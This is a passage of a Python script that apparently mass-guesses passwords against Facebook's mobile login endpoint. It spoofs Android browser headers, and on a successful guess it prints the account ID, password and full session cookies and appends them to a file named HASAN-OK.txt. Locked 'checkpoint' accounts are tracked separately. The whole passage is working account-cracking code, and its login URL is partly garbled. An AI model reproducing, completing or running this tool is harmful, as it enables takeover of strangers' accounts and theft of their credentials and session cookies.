           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
           'x-asbd-id': '198387',
           'x-fb-lsd': 'AVomoYcSNjw',
}
            lo = session.post('https://m. facebook.con/login/ device-based/login/async/?refsrc=deprecated&ht_token=Abt01 P3iph-HMna80FUEi899sHakvUDR Ih6AFJd IFPFFA8M28h_consent=1äht_I=login& Iwv=1 00',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        


Heda()